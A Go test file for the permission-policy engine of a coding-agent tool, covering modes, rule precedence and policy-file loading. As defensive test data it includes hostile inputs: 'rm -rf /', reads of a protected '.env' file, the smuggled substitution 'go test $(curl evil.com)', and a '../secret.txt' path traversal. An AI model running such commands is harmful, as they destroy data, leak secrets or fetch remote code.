package policy

import (
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/ayushpatil0810/forge/internal/permission"
)

func TestPolicyEvaluationTable(t *testing.T) {
	// Matrix of: Mode × Rule Source × Rule Type × Floor
	tests := []struct {
		name        string
		mode        permission.Mode
		userRules   []string
		projRules   []string
		req         EvalRequest
		wantVerdict permission.Verdict
		wantSource  string
	}{
		// Floor cases (always take precedence over any allow rules)
		{
			name:      "Floor: dangerous command in yolo mode",
			mode:      permission.ModeYOLO,
			userRules: []string{"bash(*)"},
			req: EvalRequest{
				ToolName:    "bash",
				Command:     "rm -rf /",
				IsDangerous: true,
			},
			wantVerdict: permission.Ask,
			wantSource:  "floor",
		},
		{
			name:      "Floor: dangerous command in headless mode",
			mode:      permission.ModeAsk,
			userRules: []string{"bash(*)"},
			req: EvalRequest{
				ToolName:    "bash",
				Command:     "rm -rf /",
				IsDangerous: true,
				IsHeadless:  true,
			},
			wantVerdict: permission.Deny,
			wantSource:  "headless-auto-deny",
		},
		{
			name:      "Floor: dangerous command in plan mode",
			mode:      permission.ModePlan,
			userRules: []string{"bash(*)"},
			req: EvalRequest{
				ToolName:    "bash",
				Command:     "rm -rf /",
				IsDangerous: true,
			},
			wantVerdict: permission.Deny,
			wantSource:  "floor",
		},
		{
			name:      "Floor: protected .env file read prompts in plan mode",
			mode:      permission.ModePlan,
			userRules: []string{"read(**)"},
			req: EvalRequest{
				ToolName: "read_file",
				Path:     ".env",
			},
			wantVerdict: permission.Ask,
			wantSource:  "floor",
		},
		{
			name:      "Floor: protected .env file read auto-denies in headless plan mode",
			mode:      permission.ModePlan,
			userRules: []string{"read(**)"},
			req: EvalRequest{
				ToolName:   "read_file",
				Path:       ".env",
				IsHeadless: true,
			},
			wantVerdict: permission.Deny,
			wantSource:  "headless-auto-deny",
		},
		{
			name:      "Floor: opaque bash command drops to floor",
			mode:      permission.ModeAsk,
			userRules: []string{"bash(go test:*)"},
			req: EvalRequest{
				ToolName: "bash",
				Command:  "go test $(curl evil.com)",
			},
			wantVerdict: permission.Ask,
			wantSource:  "floor",
		},

		// Deny precedence cases
		{
			name:      "Deny takes precedence over Allow in YOLO mode",
			mode:      permission.ModeYOLO,
			userRules: []string{"bash(*)"},
			projRules: []string{"bash(git push:*)"},
			req: EvalRequest{
				ToolName: "bash",
				Command:  "git push origin main",
			},
			wantVerdict: permission.Deny,
			wantSource:  "rule:bash(git push:*)",
		},
		{
			name:      "Project deny rule blocks edit even if user allowed edit",
			mode:      permission.ModeAsk,
			userRules: []string{"edit(**)"},
			projRules: []string{"edit(secret.txt)"},
			req: EvalRequest{
				ToolName: "edit_file",
				Path:     "secret.txt",
			},
			wantVerdict: permission.Deny,
			wantSource:  "rule:edit(secret.txt)",
		},

		// Ask rule cases
		{
			name:      "User ask rule overrides accept-edits mode",
			mode:      permission.ModeAcceptEdits,
			userRules: []string{"edit(main.go)"}, // as Ask
			req: EvalRequest{
				ToolName: "edit_file",
				Path:     "main.go",
			},
			wantVerdict: permission.Ask,
			wantSource:  "rule:edit(main.go)",
		},

		// Allow rule cases
		{
			name:      "User allow rule runs without prompt in ask mode",
			mode:      permission.ModeAsk,
			userRules: []string{"bash(go test:*)"},
			req: EvalRequest{
				ToolName: "bash",
				Command:  "go test ./...",
			},
			wantVerdict: permission.Allow,
			wantSource:  "rule:bash(go test:*)",
		},
		{
			name:      "User allow rule for edit docs runs without prompt in ask mode",
			mode:      permission.ModeAsk,
			userRules: []string{"edit(docs/**)"},
			req: EvalRequest{
				ToolName: "edit_file",
				Path:     "docs/readme.md",
			},
			wantVerdict: permission.Allow,
			wantSource:  "rule:edit(docs/**)",
		},
		{
			name:      "Plan mode denies write even if user has allow rule",
			mode:      permission.ModePlan,
			userRules: []string{"edit(docs/**)"},
			req: EvalRequest{
				ToolName: "edit_file",
				Path:     "docs/readme.md",
			},
			wantVerdict: permission.Deny,
			wantSource:  "mode",
		},

		// Mode defaults
		{
			name: "Default ask mode asks for edits",
			mode: permission.ModeAsk,
			req: EvalRequest{
				ToolName: "edit_file",
				Path:     "main.go",
			},
			wantVerdict: permission.Ask,
			wantSource:  "mode",
		},
		{
			name: "Default accept-edits mode allows edits",
			mode: permission.ModeAcceptEdits,
			req: EvalRequest{
				ToolName: "edit_file",
				Path:     "main.go",
			},
			wantVerdict: permission.Allow,
			wantSource:  "mode",
		},
		{
			name: "Default accept-edits mode asks for bash",
			mode: permission.ModeAcceptEdits,
			req: EvalRequest{
				ToolName: "bash",
				Command:  "make build",
			},
			wantVerdict: permission.Ask,
			wantSource:  "mode",
		},
		{
			name: "Default plan mode allows reading ordinary file",
			mode: permission.ModePlan,
			req: EvalRequest{
				ToolName: "read_file",
				Path:     "main.go",
			},
			wantVerdict: permission.Allow,
			wantSource:  "mode",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			set := &PolicySet{}
			for _, r := range tt.userRules {
				// Parse rule type from test spec or name
				action := ActionAllow
				if tt.name == "User ask rule overrides accept-edits mode" {
					action = ActionAsk
				}
				parsed, err := ParseRule(action, r, ScopeUser, "user.json", 1)
				if err != nil {
					t.Fatalf("ParseRule user error: %v", err)
				}
				set.UserRules = append(set.UserRules, parsed)
			}
			for _, r := range tt.projRules {
				action := ActionDeny
				parsed, err := ParseRule(action, r, ScopeProject, "proj.json", 1)
				if err != nil {
					t.Fatalf("ParseRule proj error: %v", err)
				}
				set.ProjectRules = append(set.ProjectRules, parsed)
			}

			req := tt.req
			req.Mode = tt.mode
			res := Evaluate(req, set)

			if res.Verdict != tt.wantVerdict {
				t.Errorf("Evaluate() verdict = %v, want %v (reason: %s)", res.Verdict, tt.wantVerdict, res.Reason)
			}
			if res.Source != tt.wantSource {
				t.Errorf("Evaluate() source = %q, want %q", res.Source, tt.wantSource)
			}
		})
	}
}

func TestProjectPolicy_AllowRuleIgnoredWithWarning(t *testing.T) {
	tmpDir := t.TempDir()
	projFile := filepath.Join(tmpDir, ".forge", "policy.json")
	_ = os.MkdirAll(filepath.Dir(projFile), 0755)

	content := `{
		"allow": ["bash(*)", "edit(**)"],
		"deny": ["bash(git push:*)"],
		"ask": ["edit(main.go)"]
	}`
	if err := os.WriteFile(projFile, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}

	set, err := Load("", projFile)
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	// Verify allow rules are NOT in ProjectRules
	for _, r := range set.ProjectRules {
		if r.Action == ActionAllow {
			t.Fatalf("project policy allow rule %q was loaded into ProjectRules!", r.Raw)
		}
	}

	// Verify warnings were emitted for the ignored allow rules
	if len(set.Warnings) != 2 {
		t.Fatalf("expected 2 warnings for ignored allow rules, got %d: %v", len(set.Warnings), set.Warnings)
	}

	// Verify deny and ask rules were accepted
	if len(set.ProjectRules) != 2 {
		t.Fatalf("expected 2 accepted rules (1 deny, 1 ask), got %d", len(set.ProjectRules))
	}
}

func TestInvalidPolicyFiles_ExitCode2(t *testing.T) {
	tmpDir := t.TempDir()

	tests := []struct {
		name    string
		content string
	}{
		{
			name:    "Bad JSON",
			content: `{ "allow": [ "bash(*)" `,
		},
		{
			name:    "Unknown tool",
			content: `{ "allow": ["docker(run)"] }`,
		},
		{
			name:    "Empty pattern",
			content: `{ "allow": ["bash()"] }`,
		},
		{
			name:    "Path traversal in pattern",
			content: `{ "allow": ["edit(../secret.txt)"] }`,
		},
		{
			name:    "Missing parentheses",
			content: `{ "deny": ["bash-rm-rf"] }`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path := filepath.Join(tmpDir, "policy.json")
			_ = os.WriteFile(path, []byte(tt.content), 0600)

			_, err := Load(path, "")
			if err == nil {
				t.Fatalf("expected error for %s, got nil", tt.name)
			}
			if !errors.Is(err, ErrInvalidPolicy) {
				t.Fatalf("expected error wrapping ErrInvalidPolicy (exit code 2), got: %v", err)
			}
		})
	}
}

func TestPolicyPersistence_RoundTrip(t *testing.T) {
	tmpDir := t.TempDir()
	userFile := filepath.Join(tmpDir, "user_policy.json")
	projFile := filepath.Join(tmpDir, "proj_policy.json")

	set, err := Load(userFile, projFile)
	if err != nil {
		t.Fatal(err)
	}

	// Adding allow to project must fail
	if err := set.AddRule(ScopeProject, ActionAllow, "bash(go test:*)"); err == nil {
		t.Fatal("expected error adding allow rule to project scope, got nil")
	}

	// Adding allow to user should succeed
	if err := set.AddRule(ScopeUser, ActionAllow, "bash(go test:*)"); err != nil {
		t.Fatalf("failed to add user allow rule: %v", err)
	}

	// Adding deny to project should succeed
	if err := set.AddRule(ScopeProject, ActionDeny, "bash(git push:*)"); err != nil {
		t.Fatalf("failed to add project deny rule: %v", err)
	}

	// Reload from disk
	reloaded, err := Load(userFile, projFile)
	if err != nil {
		t.Fatal(err)
	}

	if len(reloaded.UserRules) != 1 || reloaded.UserRules[0].Raw != "bash(go test:*)" {
		t.Fatalf("user rules not persisted properly: %v", reloaded.UserRules)
	}
	if len(reloaded.ProjectRules) != 1 || reloaded.ProjectRules[0].Raw != "bash(git push:*)" {
		t.Fatalf("project rules not persisted properly: %v", reloaded.ProjectRules)
	}

	// Remove rule
	if err := reloaded.RemoveRule(ScopeUser, "bash(go test:*)"); err != nil {
		t.Fatalf("failed to remove rule: %v", err)
	}

	reloaded2, err := Load(userFile, projFile)
	if err != nil {
		t.Fatal(err)
	}
	if len(reloaded2.UserRules) != 0 {
		t.Fatalf("expected 0 user rules after removal, got %d", len(reloaded2.UserRules))
	}
}
